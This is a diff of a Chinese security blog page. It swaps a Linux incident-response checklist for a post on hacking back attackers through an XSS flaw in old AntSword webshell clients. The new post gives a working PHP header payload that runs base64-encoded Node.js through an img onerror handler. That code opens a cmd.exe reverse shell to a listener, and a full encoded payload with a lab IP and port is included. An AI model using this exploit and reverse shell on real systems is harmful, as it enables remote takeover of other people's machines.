@@ -4,15 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Linux应急响应, Web安全,信息安全,渗透测试,红蓝对抗,内网安全,linux,python等">
-    <meta name="description" content="1.排查开机启动项相关文件及目录文件
-/etc/rc.local
-/etc/rc.d/rc.local
-文件夹
-/etc/rc.d/init.d                #该目录存放了可执行的脚本或文件
-/etc/rc*.d
-
-相关指">
+    <meta name="keywords" content="溯源反制—AntSword篇, Web安全,信息安全,渗透测试,红蓝对抗,内网安全,linux,python等">
+    <meta name="description" content="理论假设服务器中发现被黑客上传的蚁剑webshell，我们在应急处理结束后可以修改webshell代码，使得黑客端反向被我们控制。(蚁剑版本需要小于等于2.0.7)原理：利用老版本蚁剑存在的XSS漏洞验证XSS漏洞（将webshell改为如">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -24,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Linux应急响应 | Cliff&#39;s blog</title>
+    <title>溯源反制—AntSword篇 | Cliff&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -45,7 +38,9 @@
 
 
 
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
     <link rel="stylesheet" href="/css/post.css">
+
 
 
 
@@ -254,12 +249,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Linux应急响应</h1>
+                    <h1 class="description center-align post-title">溯源反制—AntSword篇</h1>
                 </div>
             </div>
         </div>
@@ -269,10 +264,12 @@
 
 
 
-<main class="container content">
+<main class="post-container content">
 
     
-    <!-- 文章内容详情 -->
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
 <div id="artDetail">
     <div class="card">
         <div class="card-content article-info">
@@ -281,12 +278,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E8%93%9D%E9%98%9F/">
-                                <span class="chip bg-color">蓝队</span>
+                            <a href="/tags/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">
+                                <span class="chip bg-color">溯源反制</span>
                             </a>
                         
-                            <a href="/tags/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
-                                <span class="chip bg-color">Linux应急响应</span>
+                            <a href="/tags/AntSword%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">AntSword漏洞</span>
                             </a>
                         
                     </div>
@@ -297,8 +294,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="post-category">
-                                应急响应
+                            <a href="/categories/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/" class="post-category">
+                                溯源反制
                             </a>
                         
                     </div>
@@ -310,21 +307,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-07-19
+                    2023-07-23
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-07-19
+                    2023-07-23
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    503
+                    476
                 </div>
                 
 
@@ -351,118 +348,32 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="1-排查开机启动项"><a href="#1-排查开机启动项" class="headerlink" title="1.排查开机启动项"></a>1.排查开机启动项</h1><h2 id="相关文件及目录"><a href="#相关文件及目录" class="headerlink" title="相关文件及目录"></a>相关文件及目录</h2><pre class=" language-sh"><code class="language-sh">文件
-/etc/rc.local
-/etc/rc.d/rc.local
-文件夹
-/etc/rc.d/init.d                #该目录存放了可执行的脚本或文件
-/etc/rc*.d
+                <h2 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h2><p>假设服务器中发现被黑客上传的蚁剑webshell，我们在应急处理结束后可以修改webshell代码，使得黑客端反向被我们控制。(<strong>蚁剑版本需要小于等于2.0.7</strong>)<br><strong>原理：利用老版本蚁剑存在的XSS漏洞</strong><br>验证XSS漏洞（将webshell改为如下代码，若黑客端蚁剑连接时弹框1则代表存在XSS漏洞）</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"HTTP/1.1 500 &lt;img src=1 onerror=alert(1) />"</span><span class="token punctuation">)</span> <span class="token delimiter">?></span>
 </code></pre>
-<h2 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h2><p>查看开机启动服务</p>
-<pre class=" language-sh"><code class="language-sh">systemctl list-unit-files | grep enable
+<p>XSS代码执行语句</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"HTTP/1.1 500 &lt;img src=1 onerror='eval(new Buffer(`此处存放Node js反弹代码的base64编码`,`base64`).toString())' />"</span><span class="token punctuation">)</span> <span class="token delimiter">?></span>
 </code></pre>
-<p>关闭恶意服务</p>
-<pre class=" language-sh"><code class="language-sh">sudo systemctl stop [恶意服务]
+<p>Node js调用socket模块反弹shell代码</p>
+<pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"net"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> cmd <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">net<span class="token punctuation">.</span>Socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+socket<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>xx<span class="token punctuation">,</span> <span class="token string">"xx.xx.xx.xx"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    socket<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>cmd<span class="token punctuation">.</span>stdin<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    cmd<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    cmd<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </code></pre>
-<p>删除恶意服务开机启动</p>
-<pre class=" language-sh"><code class="language-sh">sudo systemctl disable [恶意服务]
+<p>注意：<code>client.connect</code>后第一个<code>xx</code>处填入我们的回连端口，第二个<code>"xx.xx.xx.xx"</code>处填入我们回连的ip，之后将整个Node js代码进行base64编码后塞入XSS执行语句处</p>
+<p>完整的攻击payload</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"HTTP/1.1 500 &lt;img src=1 onerror='eval(new Buffer(`dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpOwp2YXIgY21kID0gcmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImNtZC5leGUiKTsKdmFyIHNvY2tldCA9IG5ldyBuZXQuU29ja2V0KCk7CnNvY2tldC5jb25uZWN0KDk5OTksICIxOTIuMTY4LjMuMjIxIiwgZnVuY3Rpb24oKXsKICAgIHNvY2tldC5waXBlKGNtZC5zdGRpbik7CiAgICBjbWQuc3Rkb3V0LnBpcGUoc29ja2V0KTsKICAgIGNtZC5zdGRlcnIucGlwZShzb2NrZXQpOwp9KTs=`,`base64`).toString())' />"</span><span class="token punctuation">)</span> <span class="token delimiter">?></span>
 </code></pre>
-<p>关闭错误时还原服务设置</p>
-<pre class=" language-sh"><code class="language-sh">sudo systemctl start [客户服务]
-sudo systemctl enable [客户服务]
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>服务器（蓝队机器）：192.168.3.221（ubuntu）<br>攻击机（黑客主机）：192.168.3.167 （Windows）<br>实验简述：我们在服务器的web目录下上传蚁剑一句话，攻击机成功连接。之后服务器发现webshell并确认是蚁剑连接，于是修改webshell内容，使得攻击机反弹shell</p>
+<p>1.黑客主机成功连接到上传至蓝队主机的webshell<br><img src="/../images/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6%E2%80%94AntSword%E7%AF%87/1.png"></p>
+<p>2.蓝队发现并修改webshell内容，并利用nc监听9999端口(设置的反弹shell端口)</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"HTTP/1.1 500 &lt;img src=1 onerror='eval(new Buffer(`dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpOwp2YXIgY21kID0gcmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImNtZC5leGUiKTsKdmFyIHNvY2tldCA9IG5ldyBuZXQuU29ja2V0KCk7CnNvY2tldC5jb25uZWN0KDk5OTksICIxOTIuMTY4LjMuMjIxIiwgZnVuY3Rpb24oKXsKICAgIHNvY2tldC5waXBlKGNtZC5zdGRpbik7CiAgICBjbWQuc3Rkb3V0LnBpcGUoc29ja2V0KTsKICAgIGNtZC5zdGRlcnIucGlwZShzb2NrZXQpOwp9KTs=`,`base64`).toString())' />"</span><span class="token punctuation">)</span> <span class="token delimiter">?></span>
 </code></pre>
-<hr>
-<h1 id="2-排查系统配置文件"><a href="#2-排查系统配置文件" class="headerlink" title="2.排查系统配置文件"></a>2.排查系统配置文件</h1><h2 id="环境变量配置文件"><a href="#环境变量配置文件" class="headerlink" title="环境变量配置文件"></a>环境变量配置文件</h2><ul>
-<li><p>/etc/profile</p>
-</li>
-<li><p>/etc/bashrc</p>
-</li>
-<li><p>/etc/bash.bashrc</p>
-</li>
-<li><p>~/.bashrc</p>
-</li>
-<li><p>~/.profile</p>
-</li>
-<li><p>~/.bash_profile</p>
-</li>
-<li><p>~/.bash_logout</p>
-<p><img src="/../images/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1.png"></p>
-<p>登录和切换用户时都会加载这些环境变量文件，而在系统登出时则会加载~/.bash_logout/</p>
-</li>
-</ul>
-<hr>
-<h1 id="3-排查资源异常以及进程"><a href="#3-排查资源异常以及进程" class="headerlink" title="3.排查资源异常以及进程"></a>3.排查资源异常以及进程</h1><h2 id="查看所有进程"><a href="#查看所有进程" class="headerlink" title="查看所有进程"></a>查看所有进程</h2><pre class=" language-sh"><code class="language-sh">sudo ps -aux
-</code></pre>
-<h2 id="查找进程文件位置"><a href="#查找进程文件位置" class="headerlink" title="查找进程文件位置"></a>查找进程文件位置</h2><pre class=" language-sh"><code class="language-sh">sudo lsof -p [PID]                #查看该pid对应进程的详细信息
-sudo ls -al /proc/pid/exe         #查看该pid对应进程的绝对路径
-sudo kill -9 [PID]                #杀掉进程
-</code></pre>
-<table>
-<thead>
-<tr>
-<th align="left">文件</th>
-<th align="left">作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">cwd</td>
-<td align="left">符号链接的是进程运行目录</td>
-</tr>
-<tr>
-<td align="left">exe</td>
-<td align="left">符号链接的是执行程序的绝对路径</td>
-</tr>
-<tr>
-<td align="left">cmdline</td>
-<td align="left">符号链接的是进程运行目录</td>
-</tr>
-<tr>
-<td align="left">environ</td>
-<td align="left">记录进程运行时系统的环境变量</td>
-</tr>
-</tbody></table>
-<h2 id="查看CPU占用"><a href="#查看CPU占用" class="headerlink" title="查看CPU占用"></a>查看CPU占用</h2><pre class=" language-sh"><code class="language-sh">top
-</code></pre>
-<h2 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h2><pre class=" language-sh"><code class="language-sh">ps -aux | sort -k4nr | head -10
-</code></pre>
-<hr>
-<h1 id="4-网络排查"><a href="#4-网络排查" class="headerlink" title="4.网络排查"></a>4.网络排查</h1><h2 id="网卡实时流量排查"><a href="#网卡实时流量排查" class="headerlink" title="网卡实时流量排查"></a>网卡实时流量排查</h2><pre class=" language-sh"><code class="language-sh">sudo iftop -i [网卡] -P
-</code></pre>
-<h2 id="网络连接排查"><a href="#网络连接排查" class="headerlink" title="网络连接排查"></a>网络连接排查</h2><pre class=" language-sh"><code class="language-sh">netstat -antup
-</code></pre>
-<ul>
-<li>-a 显示所有</li>
-<li>-n 数字形式展示连接端口</li>
-<li>-t 查看tcp连接</li>
-<li>-u 查看udp连接</li>
-<li>-p 显示相关程序名<br>着重查看ESTABLISHED的端口</li>
-</ul>
-<hr>
-<h1 id="5-定时任务排查"><a href="#5-定时任务排查" class="headerlink" title="5.定时任务排查"></a>5.定时任务排查</h1><h2 id="定时任务文件或目录"><a href="#定时任务文件或目录" class="headerlink" title="定时任务文件或目录"></a>定时任务文件或目录</h2><ul>
-<li>/var/spool/cron                                                          </li>
-<li>/etc/crontab                                                            </li>
-<li>/etc/cron.d</li>
-<li>/etc/cron.hourly</li>
-<li>/etc/cron.daily</li>
-<li>/etc/cron.weekly</li>
-<li>/etc/cron.monthly</li>
-</ul>
-<h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h2><pre class=" language-sh"><code class="language-sh">crontab -l                             #查看所有crontab计划任务
-</code></pre>
-<hr>
-<h1 id="6-用户筛查"><a href="#6-用户筛查" class="headerlink" title="6.用户筛查"></a>6.用户筛查</h1><p>检查用户的uid和gid，如果为0着重注意</p>
-<pre class=" language-sh"><code class="language-sh">/etc/passwd
-</code></pre>
-<p>查看登录用户的时间、ip</p>
-<pre class=" language-sh"><code class="language-sh">who
-</code></pre>
-<hr>
-<h1 id="7-Rootkit排查"><a href="#7-Rootkit排查" class="headerlink" title="7.Rootkit排查"></a>7.Rootkit排查</h1><h2 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h2><pre class=" language-sh"><code class="language-sh">sudo apt install chkrootkit
-sudo chkrootkit
-</code></pre>
-<h2 id="rkhunter"><a href="#rkhunter" class="headerlink" title="rkhunter"></a>rkhunter</h2><pre class=" language-sh"><code class="language-sh">sudo apt install rkhunter
-sudo rkhunter --check
-</code></pre>
+<p><img src="/../images/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6%E2%80%94AntSword%E7%AF%87/2.png"><br>3.当黑客点击连接webshell时会弹出报错(黑客会以为webshell被查杀下线)<br><img src="/../images/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6%E2%80%94AntSword%E7%AF%87/3.png"><br>4.此时黑客主机已经反弹shell至蓝队主机<br><img src="/../images/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6%E2%80%94AntSword%E7%AF%87/4.png"></p>
 
                 
             </div>
@@ -489,7 +400,7 @@ sudo rkhunter --check
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://DS-Cliff.github.io/2023/07/19/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">https://DS-Cliff.github.io/2023/07/19/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</a>
+                    <a href="https://DS-Cliff.github.io/2023/07/23/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6%E2%80%94AntSword%E7%AF%87/">https://DS-Cliff.github.io/2023/07/23/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6%E2%80%94AntSword%E7%AF%87/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -527,12 +438,12 @@ sudo rkhunter --check
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E8%93%9D%E9%98%9F/">
-                                    <span class="chip bg-color">蓝队</span>
+                                <a href="/tags/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">
+                                    <span class="chip bg-color">溯源反制</span>
                                 </a>
                             
-                                <a href="/tags/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
-                                    <span class="chip bg-color">Linux应急响应</span>
+                                <a href="/tags/AntSword%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">AntSword漏洞</span>
                                 </a>
                             
                         </div>
@@ -845,17 +756,18 @@ sudo rkhunter --check
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/07/19/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
+                <a href="/2023/07/23/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6%E2%80%94AntSword%E7%AF%87/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="Windows应急响应">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="溯源反制—AntSword篇">
                         
-                        <span class="card-title">Windows应急响应</span>
+                        <span class="card-title">溯源反制—AntSword篇</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -865,30 +777,31 @@ sudo rkhunter --check
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="post-category">
-                                    应急响应
+                            <a href="/categories/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/" class="post-category">
+                                    溯源反制
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
-                        <span class="chip bg-color">Windows应急响应</span>
+                    <a href="/tags/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">
+                        <span class="chip bg-color">溯源反制</span>
                     </a>
                     
-                    <a href="/tags/%E8%93%9D%E9%98%9F/">
-                        <span class="chip bg-color">蓝队</span>
+                    <a href="/tags/AntSword%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">AntSword漏洞</span>
                     </a>
                     
                 </div>
@@ -902,13 +815,13 @@ sudo rkhunter --check
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/07/15/Windows%E5%BB%BA%E7%AB%8B%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7/">
+                <a href="/2023/07/22/%E8%AF%BB%E3%80%8A%E8%AE%A4%E7%9F%A5%E8%A7%89%E9%86%92%E3%80%8B%E5%B0%8F%E8%AE%B0-1/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="Windows建立影子用户">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="读《认知觉醒》小记">
                         
-                        <span class="card-title">Windows建立影子用户</span>
+                        <span class="card-title">读《认知觉醒》小记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -919,14 +832,14 @@ sudo rkhunter --check
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-22
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="post-category">
-                                    权限维持
+                            <a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    读书笔记
                                 </a>
                             
                             
@@ -936,12 +849,12 @@ sudo rkhunter --check
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Windows%E5%90%8E%E9%97%A8/">
-                        <span class="chip bg-color">Windows后门</span>
+                    <a href="/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">
+                        <span class="chip bg-color">读书笔记</span>
                     </a>
                     
-                    <a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">
-                        <span class="chip bg-color">权限维持</span>
+                    <a href="/tags/%E6%96%B9%E6%B3%95%E8%AE%BA/">
+                        <span class="chip bg-color">方法论</span>
                     </a>
                     
                 </div>
@@ -1013,6 +926,87 @@ sudo rkhunter --check
 <script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
 
     
 
